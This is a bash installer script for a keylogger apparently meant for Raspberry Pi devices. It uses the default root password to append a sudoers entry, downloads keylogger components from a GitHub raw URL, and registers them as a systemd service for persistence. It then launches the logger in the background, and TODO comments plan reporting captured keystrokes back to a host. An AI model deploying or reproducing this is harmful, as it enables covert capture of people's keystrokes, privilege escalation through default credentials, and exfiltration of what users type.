#!/bin/bash
# application to install, setup, and run the keylogger.

# CHECK THAT USER CAN ISSUE SUDO
# Totally expects the root user to be an unchanged Raspberry Pi
su - root <<!
raspberry
echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
!

sudo mkdir /nicekl && cd /nicekl/

# DOWNLOAD FILES if they are not already installed
# nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
CONT=controller.py
KMAP=keymap.py
FKEY=find_keyboard.py
KLSERV=nicekeylogger.service
if test -f "$CONT" ; then
  true
else
  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/controller.py > controller.py
fi
if test -f "$KMAP" ; then
  true
else
  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/keymap.py > keymap.py
fi
if test -f "$FKEY" ; then
  true
else
  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/find_keyboard.py > find_keyboard.py
fi
if test -f "$KLSERV" ; then
  true
else
  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/nicekeylogger.service > nicekeylogger.service
fi
sudo chmod 744 test/controller.py

# SET APPLICATION AS A SERVICE WITH SYSTEMD
# copy nicekeylogger.service to /etc/systemd/system/
sudo mv nicekeylogger.service /etc/systemd/system/
systemctl enable nicekeylogger.service
systemctl daemon-reload


# RUN APPLICATION
python3 controller.py &

# REPORT BACK TO HOST
# TODO - decide the period to report back
# TODO - control size of report; only send new content? only send UDP payload? On size == x?

